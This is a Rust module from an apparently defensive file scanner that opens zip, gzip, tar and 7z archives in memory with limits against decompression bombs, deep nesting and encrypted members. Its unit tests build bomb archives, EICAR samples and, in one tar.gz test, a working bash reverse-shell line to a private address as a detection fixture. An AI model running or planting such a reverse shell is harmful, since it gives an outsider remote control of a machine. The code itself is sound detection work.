//! What is inside a file: rule matches, and for an archive, its members.
//!
//! Archives are opened in memory and never extracted to disk. Each member is
//! hashed and run through the rules, and an archive inside an archive is
//! opened in turn, down to a fixed depth.
//!
//! Every reader is bounded, because an archive is a file a stranger chose: a
//! zip of a few kilobytes can unpack to petabytes. A member that expands past
//! a ratio of its compressed size is treated as a bomb and left, and there are
//! ceilings on depth, member count, member size and total bytes. Whatever a
//! limit stopped is reported, never skipped in silence.

use std::cell::Cell;
use std::fs::File;
use std::io::{Cursor, Read, Seek};
use std::path::Path;
use std::rc::Rc;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::config::Config;
use crate::rules::{self, RuleHit};
use crate::state::Severity;

const MB: u64 = 1024 * 1024;

/// A member may expand this far beyond its compressed size before it counts
/// as a bomb, so a megabyte of zeros is fine and a gigabyte is not.
const BOMB_FLOOR: u64 = MB;

/// Notes kept per file, so a thousand encrypted members make one list, not a
/// thousand.
const MAX_NOTES: usize = 20;

/// A 7z dictionary is allocated up front, so it is checked before decoding.
const MAX_DICTIONARY: u64 = 64 * MB;

/// The ceilings for one file.
#[derive(Debug, Clone)]
pub struct Limits {
    /// Archives inside archives, the outer one counting as one.
    pub depth: u32,
    pub members: u32,
    /// The most of one member held in memory.
    pub member_bytes: u64,
    /// Everything unpacked from one file, at every depth.
    pub total_bytes: u64,
    /// Unpacked size over compressed size.
    pub ratio: u64,
}

impl Limits {
    pub fn for_config(config: &Config) -> Self {
        Self {
            depth: 3,
            members: 10_000,
            member_bytes: config.max_file_bytes().min(32 * MB),
            total_bytes: 512 * MB,
            ratio: 200,
        }
    }
}

/// Something a limit or a lock kept from being checked.
///
/// `member` is empty when it is the file itself.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Unchecked {
    Bomb { member: String, ratio: u64 },
    TooDeep { member: String, depth: u32 },
    TooManyMembers { limit: u32 },
    TooLarge { limit_mb: u64 },
    MemberTooLarge { member: String, limit_mb: u64 },
    Encrypted { member: String },
    Unreadable { member: String, reason: String },
}

impl Unchecked {
    /// A bomb is a reason for suspicion. The rest only mean the check was
    /// partial.
    pub fn severity(&self) -> Severity {
        match self {
            Unchecked::Bomb { .. } => Severity::Warning,
            _ => Severity::Info,
        }
    }

    pub fn sentence(&self) -> String {
        let name = |member: &str| if member.is_empty() { "The archive".to_string() } else { member.to_string() };
        match self {
            Unchecked::Bomb { member, ratio } => format!(
                "{} unpacks to more than {ratio} times its compressed size, which is how a decompression bomb works. It was not unpacked further.",
                name(member)
            ),
            Unchecked::TooDeep { member, depth } => format!(
                "{} is an archive nested more than {depth} deep and was not opened.",
                name(member)
            ),
            Unchecked::TooManyMembers { limit } => {
                format!("The archive holds more than {limit} files; the rest were not checked.")
            }
            Unchecked::TooLarge { limit_mb } => {
                format!("The archive unpacks to more than {limit_mb} MB; the rest was not checked.")
            }
            Unchecked::MemberTooLarge { member, limit_mb } => {
                format!("{member} is larger than {limit_mb} MB, and only its first {limit_mb} MB were checked.")
            }
            Unchecked::Encrypted { member } => format!(
                "{} is protected by a password and could not be checked. Malware is often sent this way, with the password in the message, so that scanners cannot look inside.",
                name(member)
            ),
            Unchecked::Unreadable { member, reason } => format!("{} could not be read: {reason}.", name(member)),
        }
    }
}

/// Everything learned about one file's contents.
#[derive(Serialize, Deserialize, Clone, Debug, Default, PartialEq)]
pub struct ContentReport {
    pub hits: Vec<RuleHit>,
    /// Members looked at, when the file is an archive.
    pub members: u32,
    pub unchecked: Vec<Unchecked>,
}

impl ContentReport {
    /// The worst thing in the report, if there is anything.
    pub fn severity(&self) -> Option<Severity> {
        self.hits
            .iter()
            .map(|h| h.severity)
            .chain(self.unchecked.iter().map(|u| u.severity()))
            .max()
    }
}

/// Runs the rules over a file and, if it is an archive, over its members.
pub fn inspect(path: &Path, limits: &Limits) -> ContentReport {
    let mut walker = Walker { limits, report: ContentReport::default(), total: 0, stopped: false };

    match rules::scan_file(path) {
        Ok(hits) => walker.report.hits = hits,
        Err(e) => walker.note(Unchecked::Unreadable { member: String::new(), reason: e }),
    }

    let Ok(mut file) = File::open(path) else { return walker.report };
    let length = file.metadata().map(|m| m.len()).unwrap_or(0);
    let mut head = Vec::with_capacity(512);
    if (&mut file).take(512).read_to_end(&mut head).is_err() || file.rewind().is_err() {
        return walker.report;
    }

    if let Some(kind) = sniff(&head) {
        walker.open(kind, file, length, "", 1);
    }
    walker.report
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum Kind {
    Zip,
    Gzip,
    Tar,
    SevenZip,
}

/// What the bytes say a file is, whatever its name says.
fn sniff(head: &[u8]) -> Option<Kind> {
    if head.starts_with(b"PK\x03\x04") || head.starts_with(b"PK\x05\x06") {
        Some(Kind::Zip)
    } else if head.starts_with(&[0x1F, 0x8B]) {
        Some(Kind::Gzip)
    } else if head.starts_with(&[0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]) {
        Some(Kind::SevenZip)
    } else if head.len() >= 262 && &head[257..262] == b"ustar" {
        Some(Kind::Tar)
    } else {
        None
    }
}

fn join(parent: &str, name: &str) -> String {
    if parent.is_empty() {
        name.to_string()
    } else {
        format!("{parent} › {name}")
    }
}

/// Counts what comes out of a decompressor and stops it at a ceiling.
///
/// The counter is shared so that a 7z, which hands out one reader per member,
/// is bounded as a whole.
struct Ceiling<R> {
    inner: R,
    used: Rc<Cell<u64>>,
    limit: u64,
    tripped: Rc<Cell<bool>>,
}

impl<R: Read> Read for Ceiling<R> {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let read = self.inner.read(buf)?;
        self.used.set(self.used.get() + read as u64);
        if self.used.get() > self.limit {
            self.tripped.set(true);
            return Err(std::io::Error::other("expands past its ratio limit"));
        }
        Ok(read)
    }
}

/// Which ceiling decided how much of a member to read.
#[derive(PartialEq)]
enum Binding {
    Member,
    Total,
    Ratio,
}

struct Walker<'a> {
    limits: &'a Limits,
    report: ContentReport,
    /// Bytes unpacked so far, at every depth.
    total: u64,
    /// Set when a limit for the whole file was reached.
    stopped: bool,
}

impl Walker<'_> {
    fn note(&mut self, unchecked: Unchecked) {
        if self.report.unchecked.len() < MAX_NOTES && !self.report.unchecked.contains(&unchecked) {
            self.report.unchecked.push(unchecked);
        }
    }

    /// The most a whole stream may unpack to, given its compressed size.
    fn stream_ceiling(&self, compressed: u64) -> u64 {
        compressed.max(1).saturating_mul(self.limits.ratio).max(BOMB_FLOOR)
    }

    fn open<R: Read + Seek>(&mut self, kind: Kind, reader: R, compressed: u64, label: &str, depth: u32) {
        match kind {
            Kind::Zip => self.zip(reader, label, depth),
            Kind::Tar => self.tar(reader, label, depth, None),
            Kind::Gzip => self.gzip(reader, compressed, label, depth),
            Kind::SevenZip => self.seven_zip(reader, compressed, label, depth),
        }
    }

    fn zip<R: Read + Seek>(&mut self, reader: R, label: &str, depth: u32) {
        let mut archive = match zip::ZipArchive::new(reader) {
            Ok(archive) => archive,
            Err(e) => return self.note(Unchecked::Unreadable { member: label.to_string(), reason: e.to_string() }),
        };

        for index in 0..archive.len() {
            if self.stopped {
                return;
            }

            let (name, is_dir, encrypted, compressed, declared) = match archive.by_index_raw(index) {
                Ok(entry) => (
                    entry.name().map(|n| n.into_owned()).unwrap_or_else(|_| format!("member {index}")),
                    entry.is_dir(),
                    entry.encrypted(),
                    entry.compressed_size(),
                    entry.size(),
                ),
                Err(e) => {
                    self.note(Unchecked::Unreadable { member: label.to_string(), reason: e.to_string() });
                    return;
                }
            };
            if is_dir {
                continue;
            }

            let full = join(label, &name);
            if encrypted {
                self.note(Unchecked::Encrypted { member: full });
                continue;
            }

            // The header says how far it unpacks. A size that lies low is
            // caught by the ceiling while reading; one that admits to a bomb
            // is believed without unpacking anything.
            if declared > self.stream_ceiling(compressed) {
                let ratio = self.limits.ratio;
                self.note(Unchecked::Bomb { member: full, ratio });
                continue;
            }

            let data = match archive.by_index(index) {
                Ok(mut entry) => self.read_member(&mut entry, Some(compressed), &full),
                Err(e) => {
                    self.note(Unchecked::Unreadable { member: full, reason: e.to_string() });
                    continue;
                }
            };
            if let Some(data) = data {
                self.member(full, data, depth);
            }
        }
    }

    /// A tar, either on its own or inside a gzip stream whose ceiling is
    /// `tripped` when it overflows.
    fn tar<R: Read>(&mut self, reader: R, label: &str, depth: u32, tripped: Option<Rc<Cell<bool>>>) {
        let mut archive = tar::Archive::new(reader);
        let bomb = |walker: &mut Self| {
            let ratio = walker.limits.ratio;
            walker.note(Unchecked::Bomb { member: label.to_string(), ratio });
        };
        let overflowed = |tripped: &Option<Rc<Cell<bool>>>| tripped.as_ref().is_some_and(|t| t.get());

        let entries = match archive.entries() {
            Ok(entries) => entries,
            Err(e) => return self.note(Unchecked::Unreadable { member: label.to_string(), reason: e.to_string() }),
        };

        for entry in entries {
            if self.stopped {
                return;
            }
            let mut entry = match entry {
                Ok(entry) => entry,
                Err(e) => {
                    if overflowed(&tripped) {
                        bomb(self);
                    } else {
                        self.note(Unchecked::Unreadable { member: label.to_string(), reason: e.to_string() });
                    }
                    return;
                }
            };
            if !entry.header().entry_type().is_file() {
                continue;
            }

            let name = entry.path().map(|p| p.to_string_lossy().into_owned()).unwrap_or_else(|_| "member".into());
            let full = join(label, &name);
            let data = self.read_member(&mut entry, None, &full);
            if overflowed(&tripped) {
                bomb(self);
                return;
            }
            if let Some(data) = data {
                self.member(full, data, depth);
            }
        }
    }

    fn gzip<R: Read>(&mut self, reader: R, compressed: u64, label: &str, depth: u32) {
        let tripped = Rc::new(Cell::new(false));
        let mut stream = Ceiling {
            inner: flate2::read::GzDecoder::new(reader),
            used: Rc::new(Cell::new(0)),
            limit: self.stream_ceiling(compressed),
            tripped: tripped.clone(),
        };

        // A .tar.gz is streamed as a tar, so a large one is never held whole.
        let mut head = Vec::with_capacity(512);
        if let Err(e) = (&mut stream).take(512).read_to_end(&mut head) {
            return self.note(Unchecked::Unreadable { member: label.to_string(), reason: e.to_string() });
        }
        let is_tar = sniff(&head) == Some(Kind::Tar);
        let mut chained = Cursor::new(head).chain(stream);

        if is_tar {
            return self.tar(chained, label, depth, Some(tripped));
        }

        let full = join(label, "(gzip contents)");
        let data = self.read_member(&mut chained, None, &full);
        // Past the member limit, the rest is unpacked and thrown away, which
        // is the only way to tell a large file from a bomb.
        self.drain(&mut chained);
        if tripped.get() {
            let ratio = self.limits.ratio;
            return self.note(Unchecked::Bomb { member: label.to_string(), ratio });
        }
        if let Some(data) = data {
            self.member(full, data, depth);
        }
    }

    fn seven_zip<R: Read + Seek>(&mut self, reader: R, compressed: u64, label: &str, depth: u32) {
        let mut archive = match sevenz_rust2::ArchiveReader::new(reader, sevenz_rust2::Password::empty()) {
            Ok(archive) => archive,
            Err(sevenz_rust2::Error::PasswordRequired) | Err(sevenz_rust2::Error::MaybeBadPassword(_)) => {
                return self.note(Unchecked::Encrypted { member: label.to_string() })
            }
            Err(e) => return self.note(Unchecked::Unreadable { member: label.to_string(), reason: e.to_string() }),
        };

        if let Some(size) = largest_dictionary(archive.archive()) {
            if size > MAX_DICTIONARY {
                return self.note(Unchecked::Unreadable {
                    member: label.to_string(),
                    reason: format!("it asks for {} MB of memory to unpack", size / MB),
                });
            }
        }

        let used = Rc::new(Cell::new(0));
        let tripped = Rc::new(Cell::new(false));
        let limit = self.stream_ceiling(compressed);
        let mut found: Vec<(String, Vec<u8>)> = Vec::new();

        let result = archive.for_each_entries(|entry, reader| {
            if self.stopped {
                return Ok(false);
            }
            if entry.is_directory() || !entry.has_stream() {
                return Ok(true);
            }
            let full = join(label, entry.name());
            let mut bounded = Ceiling { inner: reader, used: used.clone(), limit, tripped: tripped.clone() };
            let data = self.read_member(&mut bounded, None, &full);
            if tripped.get() {
                return Ok(false);
            }
            if let Some(data) = data {
                found.push((full, data));
            }
            // A solid archive decodes in order, so every member is read
            // through even when it is not kept.
            self.drain(&mut bounded);
            Ok(!tripped.get() && !self.stopped)
        });

        if tripped.get() {
            let ratio = self.limits.ratio;
            self.note(Unchecked::Bomb { member: label.to_string(), ratio });
        } else if let Err(e) = result {
            let reason = e.to_string();
            if reason.to_ascii_lowercase().contains("password") {
                self.note(Unchecked::Encrypted { member: label.to_string() });
            } else {
                self.note(Unchecked::Unreadable { member: label.to_string(), reason });
            }
        }

        for (name, data) in found {
            self.member(name, data, depth);
        }
    }

    /// Reads one member up to whichever ceiling is lowest, and says which one
    /// stopped it.
    fn read_member(&mut self, reader: &mut dyn Read, compressed: Option<u64>, name: &str) -> Option<Vec<u8>> {
        if self.report.members >= self.limits.members {
            let limit = self.limits.members;
            self.note(Unchecked::TooManyMembers { limit });
            self.stopped = true;
            return None;
        }
        self.report.members += 1;

        let mut cap = self.limits.member_bytes;
        let mut binding = Binding::Member;
        let remaining = self.limits.total_bytes.saturating_sub(self.total);
        if remaining < cap {
            cap = remaining;
            binding = Binding::Total;
        }
        if let Some(compressed) = compressed {
            let by_ratio = self.stream_ceiling(compressed);
            if by_ratio < cap {
                cap = by_ratio;
                binding = Binding::Ratio;
            }
        }

        let mut data = Vec::new();
        if let Err(e) = reader.take(cap + 1).read_to_end(&mut data) {
            self.note(Unchecked::Unreadable { member: name.to_string(), reason: e.to_string() });
            return None;
        }

        if data.len() as u64 > cap {
            data.truncate(cap as usize);
            self.total += cap;
            match binding {
                Binding::Ratio => {
                    let ratio = self.limits.ratio;
                    self.note(Unchecked::Bomb { member: name.to_string(), ratio });
                    return None;
                }
                Binding::Total => {
                    let limit_mb = self.limits.total_bytes / MB;
                    self.note(Unchecked::TooLarge { limit_mb });
                    self.stopped = true;
                }
                Binding::Member => {
                    let limit_mb = self.limits.member_bytes / MB;
                    self.note(Unchecked::MemberTooLarge { member: name.to_string(), limit_mb });
                }
            }
        } else {
            self.total += data.len() as u64;
        }
        Some(data)
    }

    /// Unpacks the rest of a stream without keeping it, counting it against
    /// the total.
    fn drain(&mut self, reader: &mut dyn Read) {
        let remaining = self.limits.total_bytes.saturating_sub(self.total);
        match std::io::copy(&mut reader.take(remaining + 1), &mut std::io::sink()) {
            Ok(copied) if copied > remaining => {
                self.total = self.limits.total_bytes;
                let limit_mb = self.limits.total_bytes / MB;
                self.note(Unchecked::TooLarge { limit_mb });
                self.stopped = true;
            }
            Ok(copied) => self.total += copied,
            // A ceiling that tripped says so through its own flag.
            Err(_) => {}
        }
    }

    /// Hashes a member, runs the rules over it and opens it if it is itself
    /// an archive.
    fn member(&mut self, name: String, data: Vec<u8>, depth: u32) {
        let sha256 = format!("{:x}", Sha256::digest(&data));

        match rules::scan_bytes(&data) {
            Ok(hits) => {
                for mut hit in hits {
                    hit.member = Some(name.clone());
                    hit.member_sha256 = Some(sha256.clone());
                    self.report.hits.push(hit);
                }
            }
            Err(e) => self.note(Unchecked::Unreadable { member: name.clone(), reason: e }),
        }

        if let Some(kind) = sniff(&data) {
            if depth >= self.limits.depth {
                let limit = self.limits.depth;
                self.note(Unchecked::TooDeep { member: name, depth: limit });
                return;
            }
            let length = data.len() as u64;
            self.open(kind, Cursor::new(data), length, &name, depth + 1);
        }
    }
}

/// The largest LZMA or LZMA2 dictionary any block of a 7z asks for.
fn largest_dictionary(archive: &sevenz_rust2::Archive) -> Option<u64> {
    archive
        .blocks
        .iter()
        .flat_map(|block| block.coders.iter())
        .filter_map(|coder| {
            let props = coder.properties();
            match coder.encoder_method_id() {
                id if id == sevenz_rust2::EncoderMethod::ID_LZMA && props.len() >= 5 => {
                    Some(u32::from_le_bytes([props[1], props[2], props[3], props[4]]) as u64)
                }
                id if id == sevenz_rust2::EncoderMethod::ID_LZMA2 && !props.is_empty() => {
                    let bits = props[0] as u64 & 0x3F;
                    Some(if bits >= 40 { u32::MAX as u64 } else { (2 | (bits & 1)) << (bits / 2 + 11) })
                }
                _ => None,
            }
        })
        .max()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rules::samples;
    use std::io::Write;

    /// Bytes that do not compress, from a xorshift generator.
    fn noise(length: u64) -> Vec<u8> {
        let mut state: u64 = 0x9E37_79B9_7F4A_7C15;
        (0..length)
            .map(|_| {
                state ^= state << 13;
                state ^= state >> 7;
                state ^= state << 17;
                state as u8
            })
            .collect()
    }

    fn limits() -> Limits {
        Limits { depth: 3, members: 10_000, member_bytes: 32 * MB, total_bytes: 512 * MB, ratio: 200 }
    }

    fn zip_of(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Cursor::new(Vec::new());
        {
            let mut writer = zip::ZipWriter::new(&mut out);
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated);
            for (name, data) in members {
                writer.start_file(*name, options).unwrap();
                writer.write_all(data).unwrap();
            }
            writer.finish().unwrap();
        }
        out.into_inner()
    }

    fn gzip_of(data: &[u8]) -> Vec<u8> {
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder.write_all(data).unwrap();
        encoder.finish().unwrap()
    }

    fn tar_of(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (name, data) in members {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append_data(&mut header, name, *data).unwrap();
        }
        builder.into_inner().unwrap()
    }

    fn inspect_bytes(name: &str, bytes: &[u8], limits: &Limits) -> ContentReport {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(name);
        std::fs::write(&path, bytes).unwrap();
        inspect(&path, limits)
    }

    #[test]
    fn eicar_inside_a_zip_is_found_and_named() {
        let report = inspect_bytes("a.zip", &zip_of(&[("readme.txt", b"hello"), ("eicar.com", &samples::eicar())]), &limits());
        assert_eq!(report.members, 2);
        assert_eq!(report.hits.len(), 1);
        assert_eq!(report.hits[0].rule, "eicar_test_file");
        assert_eq!(report.hits[0].member.as_deref(), Some("eicar.com"));
        assert_eq!(report.hits[0].member_sha256.as_ref().unwrap().len(), 64);
        assert!(report.unchecked.is_empty());
    }

    #[test]
    fn a_script_inside_a_tar_gz_is_found() {
        let shell = b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
        let archive = gzip_of(&tar_of(&[("pkg/install.sh", shell)]));
        let report = inspect_bytes("pkg.tar.gz", &archive, &limits());
        assert_eq!(report.hits[0].member.as_deref(), Some("pkg/install.sh"));
        assert_eq!(report.severity(), Some(Severity::Critical));
    }

    #[test]
    fn a_plain_gzip_and_a_plain_tar_are_opened_too() {
        let report = inspect_bytes("x.gz", &gzip_of(&samples::eicar()), &limits());
        assert_eq!(report.hits.len(), 1);

        let report = inspect_bytes("x.tar", &tar_of(&[("e.com", &samples::eicar())]), &limits());
        assert_eq!(report.hits.len(), 1);
    }

    #[test]
    fn a_zip_inside_a_zip_inside_a_gzip_is_followed() {
        let inner = zip_of(&[("eicar.com", &samples::eicar())]);
        let outer = zip_of(&[("inner.zip", &inner)]);
        let report = inspect_bytes("outer.zip.gz", &gzip_of(&outer), &limits());
        assert_eq!(
            report.hits[0].member.as_deref(),
            Some("(gzip contents) › inner.zip › eicar.com")
        );
    }

    #[test]
    fn nesting_stops_at_the_depth_limit_and_says_so() {
        let mut nested = zip_of(&[("eicar.com", &samples::eicar())]);
        for level in 0..4 {
            nested = zip_of(&[(&format!("level{level}.zip"), &nested)]);
        }
        let report = inspect_bytes("deep.zip", &nested, &limits());
        assert!(report.hits.is_empty(), "the payload is below the depth limit");
        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::TooDeep { .. })));
        assert_eq!(report.severity(), Some(Severity::Info));
    }

    #[test]
    fn a_zip_bomb_is_stopped_early_and_reported() {
        // 64 MB of zeros, which deflates to about 64 KB.
        let zeros = vec![0u8; 64 * MB as usize];
        let bomb = zip_of(&[("zeros.bin", &zeros)]);
        drop(zeros);
        assert!(bomb.len() < 2 * MB as usize);

        let started = std::time::Instant::now();
        let report = inspect_bytes("bomb.zip", &bomb, &limits());
        assert!(started.elapsed() < std::time::Duration::from_secs(30));

        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })), "{:?}", report.unchecked);
        assert_eq!(report.severity(), Some(Severity::Warning));
    }

    #[test]
    fn a_bomb_bigger_than_the_member_limit_is_still_called_a_bomb() {
        // Compressed to about 200 KB, so the ratio ceiling is above the 32 MB
        // member limit, and only the ratio says what this is.
        let zeros = vec![0u8; 200 * MB as usize];
        let zipped = zip_of(&[("zeros.bin", &zeros)]);
        let gzipped = gzip_of(&zeros);
        drop(zeros);

        for (name, bytes) in [("big.zip", zipped), ("big.gz", gzipped)] {
            let report = inspect_bytes(name, &bytes, &limits());
            assert!(
                report.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })),
                "{name}: {:?}",
                report.unchecked
            );
        }
    }

    #[test]
    fn a_large_honest_gzip_is_partly_checked_and_not_a_bomb() {
        let report = inspect_bytes("data.gz", &gzip_of(&noise(40 * MB)), &limits());
        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::MemberTooLarge { .. })), "{:?}", report.unchecked);
        assert!(!report.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })));
    }

    #[test]
    fn a_gzip_bomb_is_stopped_by_the_stream_ceiling() {
        let zeros = vec![0u8; 64 * MB as usize];
        let bomb = gzip_of(&zeros);
        drop(zeros);
        let report = inspect_bytes("bomb.gz", &bomb, &limits());
        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })), "{:?}", report.unchecked);
    }

    #[test]
    fn a_tar_gz_bomb_is_stopped_by_the_stream_ceiling() {
        let zeros = vec![0u8; 64 * MB as usize];
        let bomb = gzip_of(&tar_of(&[("zeros.bin", &zeros)]));
        drop(zeros);
        let report = inspect_bytes("bomb.tar.gz", &bomb, &limits());
        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })), "{:?}", report.unchecked);
    }

    #[test]
    fn honest_compression_is_not_a_bomb() {
        // Text compresses well, but nowhere near two hundred to one.
        let text: Vec<u8> = (0..200_000).flat_map(|i| format!("line {i} of an ordinary log\n").into_bytes()).collect();
        let report = inspect_bytes("logs.zip", &zip_of(&[("app.log", &text)]), &limits());
        assert!(report.unchecked.is_empty(), "{:?}", report.unchecked);
    }

    #[test]
    fn the_member_count_limit_stops_the_walk() {
        let members: Vec<(String, Vec<u8>)> = (0..6).map(|i| (format!("f{i}.txt"), b"x".to_vec())).collect();
        let refs: Vec<(&str, &[u8])> = members.iter().map(|(n, d)| (n.as_str(), d.as_slice())).collect();
        let small = Limits { members: 3, ..limits() };
        let report = inspect_bytes("many.zip", &zip_of(&refs), &small);
        assert_eq!(report.members, 3);
        assert!(report.unchecked.contains(&Unchecked::TooManyMembers { limit: 3 }));
    }

    #[test]
    fn the_total_limit_stops_the_walk() {
        let block = noise(3 * MB);
        let tight = Limits { total_bytes: 4 * MB, ..limits() };
        let report = inspect_bytes("big.zip", &zip_of(&[("a.bin", &block), ("b.bin", &block), ("c.bin", &block)]), &tight);
        assert!(report.unchecked.contains(&Unchecked::TooLarge { limit_mb: 4 }));
        assert!(report.members < 3);
    }

    #[test]
    fn a_large_member_is_checked_as_far_as_the_limit() {
        let big = noise(3 * MB);
        let small = Limits { member_bytes: MB, ..limits() };
        let report = inspect_bytes("big.zip", &zip_of(&[("big.bin", &big)]), &small);
        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::MemberTooLarge { .. })));
    }

    #[test]
    fn an_encrypted_member_is_reported_rather_than_passed_over() {
        let mut archive = zip_of(&[("secret.exe", b"MZ whatever")]);
        // Sets the encryption flag in the local and the central header.
        for signature in [&b"PK\x03\x04"[..], &b"PK\x01\x02"[..]] {
            let at = archive.windows(4).position(|w| w == signature).unwrap();
            let flag = if signature[2] == 3 { at + 6 } else { at + 8 };
            archive[flag] |= 1;
        }
        let report = inspect_bytes("locked.zip", &archive, &limits());
        assert!(report.unchecked.contains(&Unchecked::Encrypted { member: "secret.exe".into() }), "{:?}", report.unchecked);
    }

    #[test]
    fn a_broken_archive_is_reported_as_unreadable() {
        let mut broken = b"PK\x03\x04".to_vec();
        broken.extend_from_slice(&[0xAB; 100]);
        let report = inspect_bytes("broken.zip", &broken, &limits());
        assert!(report.unchecked.iter().any(|u| matches!(u, Unchecked::Unreadable { .. })));
    }

    #[test]
    fn eicar_inside_a_7z_is_found() {
        let mut out = Cursor::new(Vec::new());
        {
            let mut writer = sevenz_rust2::ArchiveWriter::new(&mut out).unwrap();
            let eicar = samples::eicar();
            writer
                .push_archive_entry(sevenz_rust2::ArchiveEntry::new_file("eicar.com"), Some(eicar.as_slice()))
                .unwrap();
            writer.finish().unwrap();
        }
        let report = inspect_bytes("a.7z", &out.into_inner(), &limits());
        assert_eq!(report.hits.len(), 1, "{:?}", report);
        assert_eq!(report.hits[0].member.as_deref(), Some("eicar.com"));
    }

    #[test]
    fn a_file_named_like_an_archive_is_judged_by_its_bytes() {
        let report = inspect_bytes("notes.zip", b"just some text", &limits());
        assert_eq!(report, ContentReport::default());
    }

    /// Run by scripts/check-false-positives.sh, not by `cargo test`.
    ///
    /// Every file under the system directories of a clean machine goes
    /// through the rules and the archive reader, and anything above
    /// information counts against the budget.
    #[test]
    #[ignore]
    fn false_positive_budget() {
        const BUDGET: usize = 0;
        let roots: Vec<String> = std::env::var("GRT_FP_ROOTS")
            .map(|v| v.split(':').map(String::from).collect())
            .unwrap_or_else(|_| vec!["/usr".into(), "/etc".into(), "/opt".into()]);

        let limits = limits();
        let started = std::time::Instant::now();
        let (mut files, mut bytes, mut members) = (0u64, 0u64, 0u64);
        let mut alarms: Vec<String> = Vec::new();
        let mut info: std::collections::BTreeMap<String, usize> = Default::default();

        for root in &roots {
            for entry in walkdir::WalkDir::new(root).follow_links(false).into_iter().flatten() {
                if !entry.file_type().is_file() {
                    continue;
                }
                let Ok(metadata) = entry.metadata() else { continue };
                if metadata.len() == 0 || metadata.len() > limits.member_bytes {
                    continue;
                }
                let report = inspect(entry.path(), &limits);
                files += 1;
                bytes += metadata.len();
                members += report.members as u64;

                for hit in &report.hits {
                    if hit.severity == Severity::Info {
                        *info.entry(hit.rule.clone()).or_default() += 1;
                    } else {
                        alarms.push(format!("{} {}{}", hit.rule, entry.path().display(), hit.member.as_ref().map(|m| format!(" › {m}")).unwrap_or_default()));
                    }
                }
                for unchecked in &report.unchecked {
                    if unchecked.severity() != Severity::Info {
                        alarms.push(format!("{} {:?}", entry.path().display(), unchecked));
                    }
                }
            }
        }

        let elapsed = started.elapsed();
        println!("roots: {}", roots.join(" "));
        println!("files: {files}, {} MB, {members} archive members", bytes / MB);
        println!("time: {:.1} s, {:.0} MB/s", elapsed.as_secs_f64(), bytes as f64 / MB as f64 / elapsed.as_secs_f64());
        println!("information only: {info:?}");
        println!("alarms: {} (budget {BUDGET})", alarms.len());
        for alarm in &alarms {
            println!("  {alarm}");
        }
        // The budget is zero today, which makes the comparison look absurd.
        #[allow(clippy::absurd_extreme_comparisons)]
        let within = alarms.len() <= BUDGET;
        assert!(within, "{} alarms on a clean machine, over the budget of {BUDGET}", alarms.len());
    }

    #[test]
    fn the_report_survives_being_stored_and_read_back() {
        let report = ContentReport {
            hits: vec![],
            members: 2,
            unchecked: vec![Unchecked::Bomb { member: "x".into(), ratio: 200 }],
        };
        let text = serde_json::to_string(&report).unwrap();
        assert_eq!(serde_json::from_str::<ContentReport>(&text).unwrap(), report);
    }
}
